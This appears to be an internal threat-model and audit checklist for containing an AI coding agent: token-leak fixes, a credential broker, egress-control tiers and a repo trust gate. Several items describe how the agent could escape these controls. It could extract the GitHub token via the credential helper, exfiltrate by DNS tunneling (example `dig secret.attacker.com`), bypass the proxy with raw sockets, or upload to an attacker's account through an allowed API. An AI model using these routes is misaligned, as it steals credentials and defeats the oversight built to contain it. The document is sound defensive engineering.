# Agent containment — work items

This doc is a threat-model + audit. Items below are candidate work; triage into the
tracker as separate issues. None implemented yet.

## P0

- [x] **Gap 2 — fix the GitHub token leak (verified live).** (a) Stop writing the inline
      `password=<token>` helper into the workspace `.git/config` (`github-auth.ts`
      `configureGitCredentials`) — it puts the `ghp_…` token in plaintext on disk; routed
      the workspace through the brokered `shipit-git-credential` helper
      (`CONTAINER_CREDENTIAL_HELPER`) instead, matching the container's global gitconfig.
      (b) The broker is host-aware: the helper forwards `host=`/`protocol=` from stdin and
      the orchestrator's `getGitCredential` emits the token only for `github.com`
      (the only host ShipIt authenticates against), echoing nothing otherwise — the inline
      local helper used to *shadow* this with a host-blind echo. Tests in
      `github-auth.test.ts` prove `git credential fill` for a non-GitHub host returns no
      credentials, that github.com still resolves via the global helper (push/pull
      unaffected), and that no plaintext token lands in `.git/config`; host scoping is
      covered by `services/github-credential.test.ts` and `agent-shim/git-credential.test.ts`.
      (TRACKER-72)
- [ ] **Gap 2-R — credential broker is caller-blind (residual after TRACKER-72).** Verified
      live 2026-06-03: `git credential fill` for `github.com` (or invoking
      `/usr/local/bin/shipit-git-credential get` directly) still returns the full `ghp_…`
      PAT to any code running in the session. The broker authorizes by host, not by caller,
      and the agent is indistinguishable from `git`. TRACKER-72 closed plaintext-at-rest and
      host-blindness but not on-demand extraction. Fix is defense-in-depth: short-lived
      repo-scoped tokens (GitHub App installation tokens, minutes-long TTL, minted
      per-turn) and/or out-of-process git (push/pull from the orchestrator host so the
      token never enters the container), with Gap 1 egress as the backstop.
- **Gap 1 — outbound egress control (SHI-90).** Full design in
  [egress-control.md](./egress-control.md). Enforcement is a network-layer gateway
  middlebox (the `HTTP_PROXY` env-var proxy is not a real control — a raw socket bypasses
  it). Delivered as **one PR, sequential commits A→B→C, each independently green**.

  **Currently on the branch:**
  - [x] Allowlist matcher (`egress-allowlist.ts` + test) — base + `SESSION_EGRESS_ALLOWLIST`
        + live MCP hosts; suffix matching rejects look-alikes. **Keep** — reused by Tier C.
  - [x] **Reverted the interim explicit-proxy slice** (superseded by the gateway; it
        presented a non-enforcing `SESSION_EGRESS_PROXY` flag that looked like protection):
        deleted `egress-proxy.ts` + test, removed the `buildEnv`
        `HTTP_PROXY`/`HTTPS_PROXY`/`NO_PROXY` injection in `container-lifecycle.ts` + its
        test, `setEgressProxy` in `session-container.ts`, the `app-lifecycle.ts` startup,
        and the `index.ts`/`shutdown-manager.ts` wiring. Trimmed the `SECURITY-MODEL.md` +
        `shipit-docs/environment.md` egress copy back to "in design". The `CONNECT`-gating
        logic lives in git history + the design doc for reuse in Tier C's transparent proxy.

  **To build (the actual control):**
  - [ ] **Tier A** — `internal` per-session network + gateway; iptables default-deny +
        `ipset` floor (Anthropic `init-firewall.sh` patterns: `gh api meta` CIDR,
        resolve-and-pin, `example.com`-must-fail self-test). NET_ADMIN lives in the
        gateway, never the agent container.
  - [ ] **Tier B** — controlled DNS resolver at the gateway: answers only allowlisted
        names (closes DNS tunneling — `dig secret.attacker.com`) and drives the ipset with
        the IPs it returns (kills stale-IP breakage). The correction over Anthropic's
        DNS-open reference; minimum tier that contains exfil.
  - [ ] **Tier C** — transparent SNI/CONNECT proxy (reuse the matcher) for hostname-level
        HTTPS policy, the allow-once / add-to-allowlist inline card (deny-fast + retry,
        persisted), and the Phase-2 hook. **Removes** the `HTTP_PROXY`/`NO_PROXY` env
        injection currently on the branch.
  - [ ] **Settings UI** — default-on global toggle (fail-secure, applies on container
        restart) + per-session override + allowlist editor. Browser-only routes are
        protected by SHI-129's per-route default-deny (just don't set
        `containerAccessible`); optionally add high-value ones to `HARD_DENY_PREFIXES`
        (`isHardDeniedGlobal`) as a backstop; update the golden route-table test.
- [ ] **Gap 1 — identity-validating proxy (Phase 2)** for allowlisted multi-tenant hosts so
      an approved API can't be used to upload into an attacker's account. Builds on the
      Tier C proxy hook.

## P1

- [x] **Gap 3 — per-repo trust gate (shipped, docs/178).** Defers `agent.install` and
      compose `command:`/`build:` on first open of an untrusted remote until the user
      accepts via `RepoTrustBanner` (`POST /api/repos/trust`); decision persisted per
      remote in `RepoStore` (`trusted` column, `isTrusted()`/`setTrusted()`); warm-pool
      pre-install gated; ShipIt-created template repos trusted by construction.
      (`service-manager-setup.ts`, `docs/178-repo-trust-gate`)

## P2

- [ ] **Gap 6 — read-only mounts.** Downgrade `/uploads` (and `/credentials` after
      first-turn provisioning) to `:ro` where the agent has no legitimate write need.
- [ ] **Gap 5 — kernel-tier hardening.** Evaluate gVisor (`runsc`) runtime, a custom
      seccomp profile, and `ReadonlyRootfs: true` with explicit writable mounts.

## Cross-cutting

- [ ] **Gap 4 — untrusted-input lens.** Treat uploaded files, cloned-repo content, web
      fetches, and MCP tool returns as untrusted; fold into the egress/trust work and
      apply to future input surfaces.
